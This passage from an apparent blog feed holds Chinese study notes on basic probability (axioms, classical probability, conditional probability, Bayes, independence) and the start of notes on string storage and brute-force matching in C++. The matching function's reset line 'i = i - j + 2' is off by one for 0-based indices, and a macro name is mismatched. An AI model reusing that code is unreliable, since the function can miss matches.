start="4"><li><strong>分配律：</strong></li></ol><p>$$<br>\begin{array}{l}A \cap(B \cup C)&#x3D;(A \cap B) \cup(A \cap C) \ A \cup(B \cap C)&#x3D;(A \cup B) \cap(A \cup C)\end{array}<br>$$</p><ol start="5"><li><strong>德摩根定律：</strong></li></ol><p>$$<br>\overline{A \cup B}&#x3D;\bar{A} \cap \bar{B}, \overline{A \cap B}&#x3D;\bar{A} \cup \bar{B}<br>$$</p><h3 id="2-3-2-概率论与集合论之间的对应关系-xD"><a href="#2-3-2-概率论与集合论之间的对应关系-xD" class="headerlink" title="2.3.2 概率论与集合论之间的对应关系&#xD;"></a>2.3.2 概率论与集合论之间的对应关系&#xD;</h3><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_-zqVx52af4.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_JuyxEINQj1.png"></p><hr><h1 id="3-频率与概率"><a href="#3-频率与概率" class="headerlink" title="3 频率与概率"></a>3 频率与概率</h1><h2 id="3-1-频率的定义与性质"><a href="#3-1-频率的定义与性质" class="headerlink" title="3.1 频率的定义与性质"></a>3.1 频率的定义与性质</h2><h3 id="3-1-1-定义"><a href="#3-1-1-定义" class="headerlink" title="3.1.1 定义"></a>3.1.1 定义</h3><p>在相同的条件下，共进行了n次试验，在这n次试验中，事件A发生的次数$n_A$称为事件A发生的频数。比值$\frac{n_{A}}{n}$称为事件A发生的频率，并记成$f_{n}(A)$。</p><h3 id="3-1-2-性质"><a href="#3-1-2-性质" class="headerlink" title="3.1.2 性质"></a>3.1.2 性质</h3><p>设 A 是随机试验 E 的任一事件, 则有</p><ol><li>$0 \leq f_{n}(A) \leq 1$</li><li>$f_{n}(S)&#x3D;1$</li><li>$若 A_{1}, A_{2}, \ldots, A_{k} 是两两互不相容的事件, 则$</li></ol><p>$$<br>f_{n}\left(A_{1} \cup A_{2} \cup \ldots \cup A_{k}\right)&#x3D;f_{n}\left(A_{1}\right)+f_{n}\left(A_{2}\right)+\ldots+f_{n}\left(A_{k}\right)<br>$$</p><blockquote><p>例1   将一枚硬币抛掷 5 次、50 次、500 次, 各做7 遍, 观察正面出现的次数及频率.</p></blockquote><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_vTs2kem0m6.png"></p><p>随n的增大, 频率 f 呈现出稳定性。可见，在大量重复的试验中, 随机事件出现的频率具有稳定性. 即通常所说的统计规律性。</p><h2 id="3-2-概率的定义与性质"><a href="#3-2-概率的定义与性质" class="headerlink" title="3.2 概率的定义与性质"></a>3.2 概率的定义与性质</h2><p>1933年, 苏联数学家柯尔莫哥洛夫（Kolmogorov）提出了概率论的公理化结构, 给出了概率的严格定义, 使概率论有了迅速的发展.</p><h3 id="3-2-1-概率的公理化定义"><a href="#3-2-1-概率的公理化定义" class="headerlink" title="3.2.1 概率的公理化定义"></a>3.2.1 概率的公理化定义</h3><p>设E是随机试验，S是它的样本空间，对于E的每一个事件A赋予一个实数 $P(A)$，称之为事件A的概率，如果它满足下列三个条件：</p><ol><li>$P(A) \geq 0 $（非负性）</li><li>$P(S)&#x3D;1$（规范性）</li><li>对于两两互斥是将$A_1,A_2,…$，有可列可加性：</li></ol><p>$$<br>    P(A_1+A_2+…) &#x3D; P(A_1) + P(A_2)+ \cdots<br>$$</p><h3 id="3-2-2-概率的性质"><a href="#3-2-2-概率的性质" class="headerlink" title="3.2.2 概率的性质"></a>3.2.2 概率的性质</h3><ol><li>$P(\varnothing)&#x3D;0$</li><li>$若 A_{1}, A_{2}, \ldots, A_{n} 是两两互不相容的事件 则有$</li></ol><p>$$<br>P\left(A_{1} \cup A_{2} \cup \cdots \cup A_{n}\right)&#x3D;P\left(A_{1}\right)+P\left(A_{2}\right)+\cdots+P\left(A_{n}\right)<br>$$</p><ol start="4"><li>$设 A, B 为两个事件,且 A \subset B, 则P(A) \leq P(B), \quad P(B-A)&#x3D;P(B)-P(A) .$</li><li>$对于任一事件 A, P(A) \leq 1.$</li><li>$设 \bar{A} 是 A 的对立事件, 则 P(\bar{A})&#x3D;1-P(A).$</li><li>$(加法公式)对于任意两事件 A, B，有P(A \cup B)&#x3D;P(A)+P(B)-P(A B) .$</li></ol><p>三个事件和的情况：</p><p>$$<br>\begin{aligned} &amp; P\left(A_{1} \cup A_{2} \cup A_{3}\right) &#x3D; {P}\left(A_{1}\right)+{P}\left(A_{2}\right)+{P}\left(A_{3}\right)-{P}\left(A_{1} A_{2}\right)-{P}\left(A_{2} A_{3}\right)- {P}\left(A_{1} A_{3}\right)+{P}\left(A_{1} A_{2} A_{3}\right) .\end{aligned}<br>$$</p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_SrI3WQ5sq5.png"></p><hr><h1 id="4-等可能概型（古典概型）"><a href="#4-等可能概型（古典概型）" class="headerlink" title="4 等可能概型（古典概型）"></a>4 等可能概型（古典概型）</h1><h2 id="4-1-等可能概型"><a href="#4-1-等可能概型" class="headerlink" title="4.1 等可能概型"></a>4.1 等可能概型</h2><h3 id="4-1-1-定义"><a href="#4-1-1-定义" class="headerlink" title="4.1.1 定义"></a>4.1.1 定义</h3><p>具有以下两个特点的试验称为等可能概型或古典概型。</p><ol><li>试验的样本空间只包含有限个元素；</li><li>试验的每个基本事件发生的可能性相同；</li></ol><h3 id="4-1-2-古典概型中事件概率的计算公式"><a href="#4-1-2-古典概型中事件概率的计算公式" class="headerlink" title="4.1.2 古典概型中事件概率的计算公式"></a>4.1.2 古典概型中事件概率的计算公式</h3><p>设试验E的样本空间由n个样本点构成，A为E的任意一个事件，且包含m个样本点，则事件A出现的概率记为：</p><p>$$<br>P(A)&#x3D;\frac{m}{n}&#x3D;\frac{A \text { 所包含样本点的个数 }}{\text { 样本点总数 }}<br>$$</p><p>称此为概率的古典定义。</p><h2 id="4-2-排列组合相关知识"><a href="#4-2-排列组合相关知识" class="headerlink" title="4.2 排列组合相关知识"></a>4.2 排列组合相关知识</h2><h3 id="4-2-1-加法原理"><a href="#4-2-1-加法原理" class="headerlink" title="4.2.1 加法原理"></a>4.2.1 加法原理</h3><p>设完成一件事有k类方法，每类又分别有$m_1 , m_2, …, m_k$种方法，而完成这件事只需其中一种方法，则完成这件事共有$m_1 + m_2+…+m_k$种方法．</p><h3 id="4-2-2-乘法原理"><a href="#4-2-2-乘法原理" class="headerlink" title="4.2.2 乘法原理"></a>4.2.2 乘法原理</h3><p>设完成一件事有n个步骤．第一步有m1种方法、第二步有m2种方法，…,第n步有mn 种方法，则完成这件事共有$m_{1} \times m_{2} \times \ldots \times m_{n}$种方法.</p><h3 id="4-2-3-不同元素的选排列"><a href="#4-2-3-不同元素的选排列" class="headerlink" title="4.2.3 不同元素的选排列"></a>4.2.3 不同元素的选排列</h3><p>从n个不相同的元素中无放回取k个的排列(k ＜ n)，称为从n个不同元素中取k个元素的选排列, 共有$\boldsymbol{P}_{n}^{k}$种。当 n＝k 时，称n个元素的全排列, 共有n!种。</p><p>$$<br>P_{n}^{k}&#x3D;n(n-1)(n-2) \ldots(n-k+1)&#x3D;\frac{n!}{(n-k)!}<br>$$</p><h3 id="4-2-4-组合"><a href="#4-2-4-组合" class="headerlink" title="4.2.4 组合"></a>4.2.4 组合</h3><p>从n个不同元素中取m个而不考虑其次序的排列（组合），共有：</p><p>$$<br>C_{n}^{m}&#x3D;\frac{n(n-1) \cdots(n-m+1)}{m!}<br>$$</p><h3 id="4-2-5-不同元素的重复排列-xD"><a href="#4-2-5-不同元素的重复排列-xD" class="headerlink" title="4.2.5 不同元素的重复排列&#xD;"></a>4.2.5 不同元素的重复排列&#xD;</h3><p>从n个不同的元索中，有放回地取k个元素进行的排列，共有${n}^{k}$种（元素允许重复$1 \leqslant k \leqslant n$）。</p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_Va1_q8CzOh.png"></p><h3 id="4-2-6-不全相异元素的排列"><a href="#4-2-6-不全相异元素的排列" class="headerlink" title="4.2.6 不全相异元素的排列"></a>4.2.6 不全相异元素的排列</h3><p>在n个元素中，有m类不同元素、每类各有k1, k2 ,… km 个，将这n个元素作全排列，共有：</p><p>$$<br>\frac{n!}{k_{1}!k_{2}!\cdots k_{m}!}<br>$$</p><h3 id="4-2-7-环排列"><a href="#4-2-7-环排列" class="headerlink" title="4.2.7 环排列"></a>4.2.7 环排列</h3><p>从n个不同元素中，选出m个不同的元素排成一个圆圈的排列，共有：</p><p>$$<br>C_{n}^{m} \frac{m!}{m}&#x3D;C_{n}^{m}(m-1)!<br>$$</p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_FUVo1q7L56.png"></p><h2 id="4-3-古典概型的基本模型-摸球模型"><a href="#4-3-古典概型的基本模型-摸球模型" class="headerlink" title="4.3 古典概型的基本模型: 摸球模型"></a>4.3 古典概型的基本模型: 摸球模型</h2><h3 id="4-3-1-无放回地摸球-xD"><a href="#4-3-1-无放回地摸球-xD" class="headerlink" title="4.3.1 无放回地摸球&#xD;"></a>4.3.1 无放回地摸球&#xD;</h3><blockquote><p>问题1  设袋中有4 只白球和 2只黑球, 现从袋中<strong>无放回</strong>地依次摸出2只球, 求这2只球都是白球的概率.</p></blockquote><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_1OmgrQd1Z4.png"></p><h3 id="4-3-2-有放回地摸球-xD"><a href="#4-3-2-有放回地摸球-xD" class="headerlink" title="4.3.2 有放回地摸球&#xD;"></a>4.3.2 有放回地摸球&#xD;</h3><blockquote><p>问题2 设袋中有4只红球和6只黑球, 现从袋中有放回地摸球3次, 求第1、2次摸到黑球、第3次摸到红球的概率.</p></blockquote><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_xRKqPUdD_Q.png"></p><h2 id="4-4-古典概型的基本模型-球放入杯子模型"><a href="#4-4-古典概型的基本模型-球放入杯子模型" class="headerlink" title="4.4 古典概型的基本模型:球放入杯子模型"></a>4.4 古典概型的基本模型:球放入杯子模型</h2><h3 id="4-4-1-杯子容量无限"><a href="#4-4-1-杯子容量无限" class="headerlink" title="4.4.1 杯子容量无限"></a>4.4.1 杯子容量无限</h3><blockquote><p>问题1 把 4 个球放到 3个杯子中去, 求第1、2个杯子中各有两个球的概率, 其中假设每个杯子可放任意多个球. &#x20;</p></blockquote><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_cQniUfE-xu.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_n7dQ79mA48.png"></p><h3 id="4-4-2-每个杯子只能放一个球"><a href="#4-4-2-每个杯子只能放一个球" class="headerlink" title="4.4.2 每个杯子只能放一个球"></a>4.4.2 每个杯子只能放一个球</h3><blockquote><p>问题2 把4个球放到10个杯子中去, 每个杯子只能放一个球, 求第1 至第4个杯子各放一个球的概率.</p></blockquote><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_tU_K9SpQkg.png"></p><h2 id="4-5-几何概型"><a href="#4-5-几何概型" class="headerlink" title="4.5 几何概型"></a>4.5 几何概型</h2><p>当随机试验的样本空间是某个区域，并且任意一点落在度量 (长度、 面积、体积) 相同的子区域是等可能的，则事件 A 的概率可定义为</p><p>$$<br>P(A)&#x3D;\frac{S_{A}}{S}<br>$$</p><p>其中S是样本空间的度量，Sa是构成事件A的子区域的度量，这样借助于几何上的度量来合理规定的概率称为几何概型。</p><p>说明：当古典概型的试验结果为连续无穷多个时，就归结为几何概型。</p><blockquote><p>例8   甲、乙两人相约在 0 到 T 这段时间内, 在预定地点会面. 先到的人等候另一个人, 经过时间 t (t&lt;T) 后离去. 设每人在0 到T 这段时间内各时刻到达该地是等可能的, 且两人到达的时刻互不牵连. 求甲、乙两人能会面的概率.</p></blockquote><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_EKZzUdgSgr.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_EzM5HvrKdS.png"></p><h2 id="4-6-总结"><a href="#4-6-总结" class="headerlink" title="4.6 总结"></a>4.6 总结</h2><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_N1UbBCpt_K.png"></p><hr><h1 id="5-条件概率"><a href="#5-条件概率" class="headerlink" title="5 条件概率"></a>5 条件概率</h1><h2 id="5-1-定义"><a href="#5-1-定义" class="headerlink" title="5.1 定义"></a>5.1 定义</h2><p>设A，B是两个事件，且P(A)&gt; 0, 称：</p><p>$$<br>P(B \mid A)&#x3D;\frac{P(A B)}{P(A)}<br>$$</p><p>为事件 A 发生的条件下事件B 发生的条件概率。</p><h2 id="5-2-性质"><a href="#5-2-性质" class="headerlink" title="5.2 性质"></a>5.2 性质</h2><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_Z33n_6OQbP.png"></p><p><strong>说明：P(B|A)与P(AB)的区别</strong></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_6wyf1v_xYC.png"></p><h2 id="5-3-乘法定理"><a href="#5-3-乘法定理" class="headerlink" title="5.3 乘法定理"></a>5.3 乘法定理</h2><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_3HRfxIB0NX.png"></p><h3 id="5-3-1-波里亚罐子模型-xD"><a href="#5-3-1-波里亚罐子模型-xD" class="headerlink" title="5.3.1 波里亚罐子模型&#xD;"></a>5.3.1 波里亚罐子模型&#xD;</h3><blockquote><p>例2  一个罐子中包含b个白球和r个红球.   随机地抽取一个球，观看颜色后放回罐中，并且再加进 c 个与所抽出的球具有相同颜色的球.  这种手续进行四次，试求第一、二次取到白球且第三、四次取到红球的概率.        &#x20;</p></blockquote><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_gBL-7vmt6N.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_a7oyY577eO.png"></p><p>当 c &gt; 0 时，由于每次取出球后会增加下一次也取到同色球的概率.   这是一个传染病模型.   每次发现一个传染病患者，都会增加再传染的概率。</p><h2 id="5-4-全概率公式"><a href="#5-4-全概率公式" class="headerlink" title="5.4 全概率公式"></a>5.4 全概率公式</h2><h3 id="5-4-1-样本空间的划分-xD"><a href="#5-4-1-样本空间的划分-xD" class="headerlink" title="5.4.1 样本空间的划分&#xD;"></a>5.4.1 样本空间的划分&#xD;</h3><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_asF6KIfP30.png"></p><h3 id="5-4-2-定义"><a href="#5-4-2-定义" class="headerlink" title="5.4.2 定义"></a>5.4.2 定义</h3><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_G2j3JFo9yP.png"></p><p>说明：全概率公式的主要用处在于它可以将一个复杂事件的概率计算问题, 分解为若干个简单事件的概率计算问题, 最后应用概率的有限可加性求出最终结果。</p><h2 id="5-5-贝叶斯公式"><a href="#5-5-贝叶斯公式" class="headerlink" title="5.5 贝叶斯公式"></a>5.5 贝叶斯公式</h2><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_1gfoXdLmZa.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_aVi4uIq3CG.png"></p><h2 id="5-6-总结"><a href="#5-6-总结" class="headerlink" title="5.6 总结"></a>5.6 总结</h2><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_uJuw97AKiu.png"></p><hr><h1 id="6-独立性"><a href="#6-独立性" class="headerlink" title="6 独立性"></a>6 独立性</h1><h2 id="6-1-两事件的独立性"><a href="#6-1-两事件的独立性" class="headerlink" title="6.1 两事件的独立性"></a>6.1 两事件的独立性</h2><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_0wZ2TTKReN.png"></p><blockquote><p>定理1：事件A、B独立的充要条件为$P(A \mid B)&#x3D;P(A), P(B)&gt;0$或$P(B \mid A)&#x3D;P(B), P(A)&gt;0$。</p></blockquote><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_ZrMCZaVPBJ.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_ca57KyuVVZ.png"></p><blockquote><p>定理 2 若两事件A、B独立, 则 $\bar{A} 与{B}, {A} 与 \bar{B}, \bar{A} 与 \bar{B}$也相互独立。</p></blockquote><h2 id="6-2-多个事件的独立性"><a href="#6-2-多个事件的独立性" class="headerlink" title="6.2 多个事件的独立性"></a>6.2 多个事件的独立性</h2><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_jed-U_97_2.png"></p><p>四个等式同时成立, 则称事件A、B、C相互独立。</p><p>当事件A、B、C两两独立时，等式$P(A B C)&#x3D;P(A) P(B) P(C)$不一定成立。</p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_O_eZq02Biw.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_dtACD5miaD.png"></p><h2 id="6-3-n个事件独立性的性质"><a href="#6-3-n个事件独立性的性质" class="headerlink" title="6.3 n个事件独立性的性质"></a>6.3 n个事件独立性的性质</h2><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_j27tFCycmw.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_x0OyThWNW6.png"></p><hr><h1 id="7-本章小结"><a href="#7-本章小结" class="headerlink" title="7 本章小结"></a>7 本章小结</h1><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_OqJQ52cPcE.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构第4章：串</title>
      <link href="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E4%B8%B2/"/>
      <url>/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="1-串的存储"><a href="#1-串的存储" class="headerlink" title="1 串的存储"></a>1 串的存储</h1><h2 id="1-1-定长顺序存储表示"><a href="#1-1-定长顺序存储表示" class="headerlink" title="1.1 定长顺序存储表示"></a>1.1 定长顺序存储表示</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSTRING 255  <span class="comment">// 用户可在255以内定义最大串长</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> SString [ MAXSTRLEN <span class="number">+1</span> ];</span><br></pre></td></tr></table></figure><h2 id="1-2-堆分配存储表示"><a href="#1-2-堆分配存储表示" class="headerlink" title="1.2 堆分配存储表示"></a>1.2 堆分配存储表示</h2><p>存储空间是在程序执行过程中动态分配得到的，在堆中使用<code>malloc</code>函数和<code>free</code>函数完成动态存储管理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *Ch;    <span class="comment">// 若是非空串，则按串长分配存储区，否则ch为NULL</span></span><br><span class="line"><span class="type">int</span> Length;  <span class="comment">// 串长度</span></span><br><span class="line">&#125;HString;</span><br></pre></td></tr></table></figure><h2 id="1-3-块链存储表示"><a href="#1-3-块链存储表示" class="headerlink" title="1.3 块链存储表示"></a>1.3 块链存储表示</h2><p>类似于线性表的链式存储结构，也可采用链表方式存储串值。</p><p>每个结点既可放一个字符，也可以存放多个字符，每个结点称为<strong>块</strong>，整个链表称为<strong>块链结构</strong>。</p><p><strong>块链的效率：</strong></p><ul><li>每个结点中数据域越大，效率越高。</li></ul><p>$$<br>    存储密度 &#x3D; \frac{串所占的存储位}{实际分配的存储位}<br>$$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE 80  <span class="comment">// 块大小</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Chunk</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> ch[CHUNKSIZE];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Chunk</span> *Next;</span><br><span class="line">&#125;Chunk;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">Chunk *Head, *Tail; <span class="comment">// 头指针和尾指针</span></span><br><span class="line"><span class="type">int</span> Length;              <span class="comment">//串的长度</span></span><br><span class="line">&#125;LString;</span><br></pre></td></tr></table></figure><hr><h1 id="2-串的模式匹配"><a href="#2-串的模式匹配" class="headerlink" title="2 串的模式匹配"></a>2 串的模式匹配</h1><h2 id="2-1-简单的模式匹配算法"><a href="#2-1-简单的模式匹配算法" class="headerlink" title="2.1 简单的模式匹配算法"></a>2.1 简单的模式匹配算法</h2><p>子串的定位操作通常称作串的模式匹配（其中T被称模式串），是各种串处理系统中最重要的操作之一。</p><h3 id="2-1-1-基本思想"><a href="#2-1-1-基本思想" class="headerlink" title="2.1.1 基本思想"></a>2.1.1 基本思想</h3><ol><li>从主串S的第一个字符起和模式的第一个字符比较之<ul><li>若相等，则继续逐个比较后续字符</li><li>否则从主串的下一个字符起再重新和模式的字符比较之</li></ul></li><li>依次类推，直至模式T中的每个字符依次和主串S中的一个连续的字符序列相等，则称匹配成功</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">BF</span><span class="params">(string S, string T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; S.<span class="built_in">size</span>() &amp;&amp; j &lt; T.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (S[i] == T[j]) i ++, j ++;</span><br><span class="line"><span class="keyword">else</span> i = i - j + <span class="number">2</span>, j = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= T.<span class="built_in">size</span>()) <span class="keyword">return</span> i - T.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">return</span> 